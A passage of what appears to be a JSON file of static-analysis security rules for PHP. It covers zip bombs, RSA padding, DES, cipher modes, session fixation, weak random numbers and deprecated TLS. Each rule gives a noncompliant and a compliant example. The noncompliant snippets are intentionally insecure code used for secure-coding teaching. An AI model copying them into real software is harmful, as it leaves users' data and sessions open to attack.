mkdir($filename);\n    }\n}\nzip_close($zip);\n</pre>\n<h2>Compliant Solution</h2>\n<p>For <a href=\"https://www.php.net/manual/en/class.ziparchive.php\">ZipArchive</a> module:</p>\n<pre>\ndefine('MAX_FILES', 10000);\ndefine('MAX_SIZE', 1000000000); // 1 GB\ndefine('MAX_RATIO', 10);\ndefine('READ_LENGTH', 1024);\n\n$fileCount = 0;\n$totalSize = 0;\n\n$zip = new ZipArchive();\nif ($zip-&gt;open($file) === true) {\n    for ($i = 0; $i &lt; $zip-&gt;numFiles; $i++) {\n        $filename = $zip-&gt;getNameIndex($i);\n        $stats = $zip-&gt;statIndex($i);\n\n        if (strpos($filename, '../') !== false || substr($filename, 0, 1) === '/') {\n            throw new Exception();\n        }\n\n        if (substr($filename, -1) !== '/') {\n            $fileCount++;\n            if ($fileCount &gt; MAX_FILES) {\n                // Reached max. number of files\n                throw new Exception();\n            }\n\n            $fp = $zip-&gt;getStream($filename); // Compliant\n            $currentSize = 0;\n            while (!feof($fp)) {\n                $currentSize += READ_LENGTH;\n                $totalSize += READ_LENGTH;\n\n                if ($totalSize &gt; MAX_SIZE) {\n                    // Reached max. size\n                    throw new Exception();\n                }\n\n                // Additional protection: check compression ratio\n                if ($stats['comp_size'] &gt; 0) {\n                    $ratio = $currentSize / $stats['comp_size'];\n                    if ($ratio &gt; MAX_RATIO) {\n                        // Reached max. compression ratio\n                        throw new Exception();\n                    }\n                }\n\n                file_put_contents($filename, fread($fp, READ_LENGTH), FILE_APPEND);\n            }\n\n            fclose($fp);\n        } else {\n            mkdir($filename);\n        }\n    }\n    $zip-&gt;close();\n}\n</pre>\n<p>For <a href=\"https://www.php.net/manual/en/ref.zip.php\">Zip</a> module:</p>\n<pre>\ndefine('MAX_FILES', 10000);\ndefine('MAX_SIZE', 1000000000); // 1 GB\ndefine('MAX_RATIO', 10);\ndefine('READ_LENGTH', 1024);\n\n$fileCount = 0;\n$totalSize = 0;\n\n$zip = zip_open($file);\nwhile ($file = zip_read($zip)) {\n    $filename = zip_entry_name($file);\n\n    if (strpos($filename, '../') !== false || substr($filename, 0, 1) === '/') {\n        throw new Exception();\n    }\n\n    if (substr($filename, -1) !== '/') {\n        $fileCount++;\n        if ($fileCount &gt; MAX_FILES) {\n            // Reached max. number of files\n            throw new Exception();\n        }\n\n        $currentSize = 0;\n        while ($data = zip_entry_read($file, READ_LENGTH)) { // Compliant\n            $currentSize += READ_LENGTH;\n            $totalSize += READ_LENGTH;\n\n            if ($totalSize &gt; MAX_SIZE) {\n                // Reached max. size\n                throw new Exception();\n            }\n\n            // Additional protection: check compression ratio\n            if (zip_entry_compressedsize($file) &gt; 0) {\n                $ratio = $currentSize / zip_entry_compressedsize($file);\n                if ($ratio &gt; MAX_RATIO) {\n                    // Reached max. compression ratio\n                    throw new Exception();\n                }\n            }\n\n            file_put_contents($filename, $data, FILE_APPEND);\n        }\n    } else {\n        mkdir($filename);\n    }\n}\nzip_close($zip);\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control\">Top 10 2017 Category A5 - Broken Access Control</a>\n  </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/409\">CWE-409 - Improper Handling of Highly Compressed Data (Data Amplification)</a> </li>\n  <li> <a href=\"https://www.bamsoftware.com/hacks/zipbomb/\">bamsoftware.com</a> - A better Zip Bomb </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "php:S2277": {
        "name": "Cryptographic RSA algorithms should always incorporate OAEP (Optimal Asymmetric Encryption Padding)",
        "htmlDesc": "<p>This rule is deprecated; use <a href='/coding_rules#rule_key=php%3AS5542'>S5542</a> instead.</p>\n<h2>Why is this an issue?</h2>\n<p>Without OAEP in RSA encryption, it takes less work for an attacker to decrypt the data or infer patterns from the ciphertext. This rule logs an\nissue when <code>openssl_public_encrypt</code> is used with one the following padding constants: <code>OPENSSL_NO_PADDING</code> or\n<code>OPENSSL_PKCS1_PADDING</code> or <code>OPENSSL_SSLV23_PADDING</code>.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nfunction encrypt($data, $key) {\n  $crypted='';\n  openssl_public_encrypt($data, $crypted, $key, OPENSSL_NO_PADDING); // Noncompliant\n  return $crypted;\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nfunction encrypt($data, $key) {\n  $crypted='';\n  openssl_public_encrypt($data, $crypted, $key, OPENSSL_PKCS1_OAEP_PADDING);\n  return $crypted;\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/780\">CWE-780 - Use of RSA Algorithm without OAEP</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/327\">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>\n  <li> Derived from FindSecBugs rule <a href=\"https://h3xstream.github.io/find-sec-bugs/bugs.htm#RSA_NO_PADDING\">RSA NoPadding Unsafe</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "php:S2278": {
        "name": "Neither DES (Data Encryption Standard) nor DESede (3DES) should be used",
        "htmlDesc": "<p>This rule is deprecated; use <a href='/coding_rules#rule_key=php%3AS5547'>S5547</a> instead.</p>\n<h2>Why is this an issue?</h2>\n<p>According to the US National Institute of Standards and Technology (NIST), the Data Encryption Standard (DES) is no longer considered secure:</p>\n<blockquote>\n  <p>Adopted in 1977 for federal agencies to use in protecting sensitive, unclassified information, the DES is being withdrawn because it no longer\n  provides the security that is needed to protect federal government information.</p>\n  <p>Federal agencies are encouraged to use the Advanced Encryption Standard, a faster and stronger algorithm approved as FIPS 197 in 2001.</p>\n</blockquote>\n<p>For similar reasons, RC2 should also be avoided.</p>\n<h3>Noncompliant code example</h3>\n<pre>\n&lt;?php\n  $ciphertext = mcrypt_encrypt(MCRYPT_DES, $key, $plaintext, $mode); // Noncompliant\n  // ...\n  $ciphertext = mcrypt_encrypt(MCRYPT_DES_COMPAT, $key, $plaintext, $mode); // Noncompliant\n  // ...\n  $ciphertext = mcrypt_encrypt(MCRYPT_TRIPLEDES, $key, $plaintext, $mode); // Noncompliant\n  // ...\n  $ciphertext = mcrypt_encrypt(MCRYPT_3DES, $key, $plaintext, $mode); // Noncompliant\n\n  $cipher = \"des-ede3-cfb\";  // Noncompliant\n  $ciphertext_raw = openssl_encrypt($plaintext, $cipher, $key, $options=OPENSSL_RAW_DATA, $iv);\n?&gt;\n</pre>\n<h3>Compliant solution</h3>\n<pre>\n&lt;?php\n  $ciphertext = mcrypt_encrypt(MCRYPT_RIJNDAEL_128, $key, $plaintext, MCRYPT_MODE_CBC, $iv);\n?&gt;\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/326\">CWE-326 - Inadequate Encryption Strength</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/327\">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>\n  <li> Derived from FindSecBugs rule <a href=\"https://h3xstream.github.io/find-sec-bugs/bugs.htm#DES_USAGE\">DES / DESede Unsafe</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "php:S5542": {
        "name": "Encryption algorithms should be used with secure mode and padding scheme",
        "htmlDesc": "<p>This vulnerability exposes encrypted data to a number of attacks whose goal is to recover the plaintext.</p>\n<h2>Why is this an issue?</h2>\n<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used\nfor several important reasons:</p>\n<ul>\n  <li> Confidentiality, privacy, and intellectual property protection </li>\n  <li> Security during transmission or on storage devices </li>\n  <li> Data integrity, general trust, and authentication </li>\n</ul>\n<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>\n<ol>\n  <li> No encryption is unbreakable. </li>\n  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>\n</ol>\n<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and\nsecure by the cryptography community.</p>\n<p>For AES, the weakest mode is ECB (Electronic Codebook). Repeated blocks of data are encrypted to the same value, making them easy to identify and\nreducing the difficulty of recovering the original cleartext.</p>\n<p>Unauthenticated modes such as CBC (Cipher Block Chaining) may be used but are prone to attacks that manipulate the ciphertext. They must be used\nwith caution.</p>\n<p>For RSA, the weakest algorithms are either using it without padding or using the PKCS1v1.5 padding scheme.</p>\n<h3>What is the potential impact?</h3>\n<p>The cleartext of an encrypted message might be recoverable. Additionally, it might be possible to modify the cleartext of an encrypted message.</p>\n<p>Below are some real-world scenarios that illustrate possible impacts of an attacker exploiting the vulnerability.</p>\n<h4>Theft of sensitive data</h4>\n<p>The encrypted message might contain data that is considered sensitive and should not be known to third parties.</p>\n<p>By using a weak algorithm the likelihood that an attacker might be able to recover the cleartext drastically increases.</p>\n<h4>Additional attack surface</h4>\n<p>By modifying the cleartext of the encrypted message it might be possible for an attacker to trigger other vulnerabilities in the code. Encrypted\nvalues are often considered trusted, since under normal circumstances it would not be possible for a third party to modify them.</p>\n<h2>How to fix it in Mcrypt</h2>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<p>Example with a symmetric cipher, AES:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nmcrypt_encrypt(MCRYPT_DES, $key, $plaintext, \"ecb\"); // Noncompliant\n</pre>\n<h4>Compliant solution</h4>\n<p>Mcrypt is deprecated and should not be used. You can use <a href=\"https://www.php.net/manual/en/book.sodium.php\">Sodium</a> instead.</p>\n<p>For the AES symmetric cipher, use the GCM mode:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nsodium_crypto_aead_aes256gcm_encrypt($plaintext, '', $nonce, $key);\n</pre>\n<h3>How does this work?</h3>\n<p>As a rule of thumb, use the cryptographic algorithms and mechanisms that are considered strong by the cryptographic community.</p>\n<p>Appropriate choices are currently the following.</p>\n<h4>For AES: use authenticated encryption modes</h4>\n<p>The best-known authenticated encryption mode for AES is Galois/Counter mode (GCM).</p>\n<p>GCM mode combines encryption with authentication and integrity checks using a cryptographic hash function and provides both confidentiality and\nauthenticity of data.</p>\n<p>Other similar modes are:</p>\n<ul>\n  <li> CCM: <code>Counter with CBC-MAC</code> </li>\n  <li> CWC: <code>Cipher Block Chaining with Message Authentication Code</code> </li>\n  <li> EAX: <code>Encrypt-and-Authenticate</code> </li>\n  <li> IAPM: <code>Integer Authenticated Parallelizable Mode</code> </li>\n  <li> OCB: <code>Offset Codebook Mode</code> </li>\n</ul>\n<p>It is also possible to use AES-CBC with HMAC for integrity checks. However, it is considered more straightforward to use AES-GCM directly\ninstead.</p>\n<h4>For RSA: use the OAEP scheme</h4>\n<p>The Optimal Asymmetric Encryption Padding scheme (OAEP) adds randomness and a secure hash function that strengthens the regular inner workings of\nRSA.</p>\n<h2>Resources</h2>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://learn.microsoft.com/en-us/dotnet/standard/security/vulnerabilities-cbc-mode\">Microsoft, Timing vulnerabilities with CBC-mode\n  symmetric decryption using padding</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Padding_oracle_attack\">Wikipedia, Padding Oracle Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Chosen-ciphertext_attack\">Wikipedia, Chosen-Ciphertext Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Chosen-plaintext_attack\">Wikipedia, Chosen-Plaintext Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Semantic_security\">Wikipedia, Semantically Secure Cryptosystems</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding\">Wikipedia, OAEP</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Galois/Counter_Mode\">Wikipedia, Galois/Counter Mode</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/327\">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "php:S5547": {
        "name": "Cipher algorithms should be robust",
        "htmlDesc": "<p>This vulnerability makes it possible that the cleartext of the encrypted message might be recoverable without prior knowledge of the key.</p>\n<h2>Why is this an issue?</h2>\n<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communication in various domains. They are used for\nseveral important reasons:</p>\n<ul>\n  <li> Confidentiality, privacy, and intellectual property protection </li>\n  <li> Security during transmission or on storage devices </li>\n  <li> Data integrity, general trust, and authentication </li>\n</ul>\n<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>\n<ol>\n  <li> No encryption is unbreakable. </li>\n  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>\n</ol>\n<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and\nsecure by the cryptography community.</p>\n<h3>What is the potential impact?</h3>\n<p>The cleartext of an encrypted message might be recoverable. Additionally, it might be possible to modify the cleartext of an encrypted message.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Theft of sensitive data</h4>\n<p>The encrypted message might contain data that is considered sensitive and should not be known to third parties.</p>\n<p>By using a weak algorithm the likelihood that an attacker might be able to recover the cleartext drastically increases.</p>\n<h4>Additional attack surface</h4>\n<p>By modifying the cleartext of the encrypted message it might be possible for an attacker to trigger other vulnerabilities in the code. Encrypted\nvalues are often considered trusted, since under normal circumstances it would not be possible for a third party to modify them.</p>\n<h2>How to fix it in Mcrypt</h2>\n<h3>Code examples</h3>\n<p>The following code contains examples of algorithms that are not considered highly resistant to cryptanalysis and thus should be avoided.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nmcrypt_encrypt(MCRYPT_DES, $key, $plaintext, $mode); // Noncompliant\n</pre>\n<h4>Compliant solution</h4>\n<p>Mcrypt is deprecated and should not be used. You can use <a href=\"https://www.php.net/manual/en/book.sodium.php\">Sodium</a> instead.</p>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nsodium_crypto_aead_aes256gcm_encrypt($plaintext, '', $nonce, $key);\n</pre>\n<h3>How does this work?</h3>\n<h4>Use a secure algorithm</h4>\n<p>It is highly recommended to use an algorithm that is currently considered secure by the cryptographic community. A common choice for such an\nalgorithm is the Advanced Encryption Standard (AES).</p>\n<p>For block ciphers, it is not recommended to use algorithms with a block size that is smaller than 128 bits.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/327\">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "php:S5876": {
        "name": "A new session should be created during user authentication",
        "htmlDesc": "<p>An attacker may trick a user into using a predetermined session identifier. Consequently, this attacker can gain unauthorized access and\nimpersonate the user’s session. This kind of attack is called session fixation, and protections against it should not be disabled.</p>\n<h2>Why is this an issue?</h2>\n<p>Session fixation attacks take advantage of the way web applications manage session identifiers. Here’s how a session fixation attack typically\nworks:</p>\n<ul>\n  <li> When a user visits a website or logs in, a session is created for them. </li>\n  <li> This session is assigned a unique session identifier, stored in a cookie, in local storage, or through URL parameters. </li>\n  <li> In a session fixation attack, an attacker tricks a user into using a predetermined session identifier controlled by the attacker. For example,\n  the attacker sends the victim an email containing a link with this predetermined session identifier. </li>\n  <li> When the victim clicks on the link, the web application does not create a new session identifier but uses this identifier known to the\n  attacker. </li>\n  <li> At this point, the attacker can hijack and impersonate the victim’s session. </li>\n</ul>\n<h3>What is the potential impact?</h3>\n<p>Session fixation attacks pose a significant security risk to web applications and their users. By exploiting this vulnerability, attackers can gain\nunauthorized access to user sessions, potentially leading to various malicious activities. Some of the most relevant scenarios are the following:</p>\n<h4>Impersonation</h4>\n<p>Once an attacker successfully fixes a session identifier, they can impersonate the victim and gain access to their account without providing valid\ncredentials. This can result in unauthorized actions, such as modifying personal information, making unauthorized transactions, or even performing\nmalicious activities on behalf of the victim. An attacker can also manipulate the victim into performing actions they wouldn’t normally do, such as\nrevealing sensitive information or conducting financial transactions on the attacker’s behalf.</p>\n<h4>Data Breach</h4>\n<p>If an attacker gains access to a user’s session, they may also gain access to sensitive data associated with that session. This can include\npersonal information, financial details, or any other confidential data that the user has access to within the application. The compromised data can\nbe used for identity theft, financial fraud, or other malicious purposes.</p>\n<h4>Privilege Escalation</h4>\n<p>In some cases, session fixation attacks can be used to escalate privileges within a web application. By fixing a session identifier with higher\nprivileges, an attacker can bypass access controls and gain administrative or privileged access to the application. This can lead to unauthorized\nmodifications, data manipulation, or even complete compromise of the application and its underlying systems.</p>\n<h3>How to fix it in Symfony</h3>\n<h3>Code examples</h3>\n<p>In a Symfony Security’s context, session fixation protection can be disabled with the value <code>none</code> for the\n<code>session_fixation_strategy</code> attribute.</p>\n<p>Session fixation protection is enabled by default in Symfony. It can be explicitly enabled with the values <code>migrate</code> and\n<code>invalidate</code> for the <code>session_fixation_strategy</code> attribute.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nnamespace Symfony\\Component\\DependencyInjection\\Loader\\Configurator;\n\nreturn static function (ContainerConfigurator $container) {\n    $container-&gt;extension('security', [\n        'session_fixation_strategy' =&gt; 'none', // Noncompliant\n    ]);\n};\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nnamespace Symfony\\Component\\DependencyInjection\\Loader\\Configurator;\n\nreturn static function (ContainerConfigurator $container) {\n    $container-&gt;extension('security', [\n        'session_fixation_strategy' =&gt; 'migrate',\n    ]);\n};\n</pre>\n<h3>How does this work?</h3>\n<p>The protection works by ensuring that the session identifier, which is used to identify and track a user’s session, is changed or regenerated\nduring the authentication process.</p>\n<p>Here’s how session fixation protection typically works:</p>\n<ol>\n  <li> When a user visits a website or logs in, a session is created for them. This session is assigned a unique session identifier, which is stored\n  in a cookie or passed through URL parameters. </li>\n  <li> In a session fixation attack, an attacker tricks a user into using a predetermined session identifier controlled by the attacker. This allows\n  the attacker to potentially gain unauthorized access to the user’s session. </li>\n  <li> To protect against session fixation attacks, session fixation protection mechanisms come into play during the authentication process. When a\n  user successfully authenticates, this mechanism generates a new session identifier for the user’s session. </li>\n  <li> The old session identifier, which may have been manipulated by the attacker, is invalidated and no longer associated with the user’s session.\n  This ensures that any attempts by the attacker to use the fixed session identifier are rendered ineffective. </li>\n  <li> The user is then assigned the new session identifier, which is used for subsequent requests and session tracking. This new session identifier\n  is typically stored in a new session cookie or passed through URL parameters. </li>\n</ol>\n<p>By regenerating the session identifier upon authentication, session fixation protection helps ensure that the user’s session is tied to a new,\nsecure identifier that the attacker cannot predict or control. This mitigates the risk of an attacker gaining unauthorized access to the user’s\nsession and helps maintain the integrity and security of the application’s session management process.</p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<p><a href=\"https://symfony.com/doc/current/reference/configuration/security.html#session-fixation-strategy\">Security Configuration Reference -\nSession Fixation Strategy</a></p>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">Top 10 2021 Category A7 - Identification and\n  Authentication Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication\">Top 10 2017 Category A2 - Broken Authentication</a>\n  </li>\n  <li> <a href=\"https://owasp.org/www-community/attacks/Session_fixation\">OWASP Sesssion Fixation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/384\">CWE-384 - Session Fixation</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "php:S2245": {
        "name": "Using pseudorandom number generators (PRNGs) is security-sensitive",
        "htmlDesc": "<p>Using pseudorandom number generators (PRNGs) is security-sensitive. For example, it has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-6386\">CVE-2013-6386</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3419\">CVE-2006-3419</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4102\">CVE-2008-4102</a> </li>\n</ul>\n<p>When software generates predictable values in a context requiring unpredictability, it may be possible for an attacker to guess the next value that\nwill be generated, and use this guess to impersonate another user or access sensitive information.</p>\n<p>As the <code>rand()</code> and <code>mt_rand()</code> functions rely on a pseudorandom number generator, it should not be used for\nsecurity-critical applications or for protecting sensitive data.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> the code using the generated value requires it to be unpredictable. It is the case for all encryption mechanisms or when a secret value, such\n  as a password, is hashed. </li>\n  <li> the function you use generates a value which can be predicted (pseudo-random). </li>\n  <li> the generated value is used multiple times. </li>\n  <li> an attacker can access the generated value. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Use functions which rely on a cryptographically strong random number generator such as <code>random_int()</code> or <code>random_bytes()</code>\n  or <code>openssl_random_pseudo_bytes()</code> </li>\n  <li> When using <code>openssl_random_pseudo_bytes()</code>, provide and check the <code>crypto_strong</code> parameter </li>\n  <li> Use the generated random values only once. </li>\n  <li> You should not expose the generated random value. If you have to store it, make sure that the database or file is secure. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\n$random = rand();\n$random2 = mt_rand(0, 99);\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n$randomInt = random_int(0,99); // Compliant; generates a cryptographically secure random integer\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements\">Mobile AppSec\n  Verification Standard - Cryptography Requirements</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography\">Mobile Top 10 2016 Category M5 -\n  Insufficient Cryptography</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/338\">CWE-338 - Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG)</a>\n  </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/330\">CWE-330 - Use of Insufficiently Random Values</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/326\">CWE-326 - Inadequate Encryption Strength</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/1241\">CWE-1241 - Use of Predictable Algorithm in Random Number Generator</a> </li>\n  <li> Derived from FindSecBugs rule <a href=\"https://h3xstream.github.io/find-sec-bugs/bugs.htm#PREDICTABLE_RANDOM\">Predictable Pseudo Random Number\n  Generator</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "php:S4423": {
        "name": "Weak SSL/TLS protocols should not be used",
        "htmlDesc": "<p>This vulnerability exposes encrypted data to a number of attacks whose goal is to recover the plaintext.</p>\n<h2>Why is this an issue?</h2>\n<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used\nfor several important reasons:</p>\n<ul>\n  <li> Confidentiality, privacy, and intellectual property protection </li>\n  <li> Security during transmission or on storage devices </li>\n  <li> Data integrity, general trust, and authentication </li>\n</ul>\n<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>\n<ol>\n  <li> No encryption is unbreakable. </li>\n  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>\n</ol>\n<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and\nsecure by the cryptography community.</p>\n<p>To provide communication security over a network, SSL and TLS are generally used. However, it is important to note that the following protocols are\nall considered weak by the cryptographic community, and are officially deprecated:</p>\n<ul>\n  <li> SSL versions 1.0, 2.0 and 3.0 </li>\n  <li> TLS versions 1.0 and 1.1 </li>\n</ul>\n<p>When these unsecured protocols are used, it is best practice to expect a breach: that a user or organization with malicious intent will perform\nmathematical attacks on this data after obtaining it by other means.</p>\n<h3>What is the potential impact?</h3>\n<p>After retrieving encrypted data and performing cryptographic attacks on it on a given timeframe, attackers can recover the plaintext that\nencryption was supposed to protect.</p>\n<p>Depending on the recovered data, the impact may vary.</p>\n<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>\n<h4>Additional attack surface</h4>\n<p>By modifying the plaintext of the encrypted message, an attacker may be able to trigger additional vulnerabilities in the code. An attacker can\nfurther exploit a system to obtain more information.<br> Encrypted values are often considered trustworthy because it would not be possible for a\nthird party to modify them under normal circumstances.</p>\n<h4>Breach of confidentiality and privacy</h4>\n<p>When encrypted data contains personal or sensitive information, its retrieval by an attacker can lead to privacy violations, identity theft,\nfinancial loss, reputational damage, or unauthorized access to confidential systems.</p>\n<p>In this scenario, the company, its employees, users, and partners could be seriously affected.</p>\n<p>The impact is twofold, as data breaches and exposure of encrypted data can undermine trust in the organization, as customers, clients and\nstakeholders may lose confidence in the organization’s ability to protect their sensitive data.</p>\n<h4>Legal and compliance issues</h4>\n<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If encrypted data is compromised and the\nplaintext can be recovered, companies face legal consequences, penalties, or violations of privacy laws.</p>\n<h2>How to fix it in Core PHP</h2>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n$opts = array(\n  'ssl' =&gt; [\n    'crypto_method' =&gt; STREAM_CRYPTO_METHOD_TLSv1_1_CLIENT // Noncompliant\n  ],\n  'http'=&gt;array(\n    'method'=&gt;\"GET\"\n  )\n);\n\n$context = stream_context_create($opts);\n\n$fp = fopen('https://www.example.com', 'r', false, $context);\nfpassthru($fp);\nfclose($fp);\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n$opts = array(\n  'ssl' =&gt; [\n    'crypto_method' =&gt; STREAM_CRYPTO_METHOD_TLSv1_2_CLIENT\n  ],\n  'http'=&gt;array(\n    'method'=&gt;\"GET\"\n  )\n);\n\n$context = stream_context_create($opts);\n\n$fp = fopen('https://www.example.com', 'r', false, $context);\nfpassthru($fp);\nfclose($fp);\n</pre>\n<h3>How does this work?</h3>\n<p>As a rule of thumb, by default you should use the cryptographic algorithms and mechanisms that are considered strong by the cryptographic\ncommunity.</p>\n<p>The best choices at the moment are the following.</p>\n<h4>Use TLS v1.2 or TLS v1.3</h4>\n<p>Even though TLS V1.3 is available, using TLS v1.2 is still considered good and secure practice by the cryptography community.<br></p>\n<p>The use of TLS v1.2 ensures compatibility with a wide range of platforms and enables seamless communication between different systems that do not\nyet have TLS v1.3 support.</p>\n<p>The only drawback depends on whether the framework used is outdated: its TLS v1.2 settings may enable older and insecure cipher suites that are\ndeprecated as insecure.</p>\n<p>On the other hand, 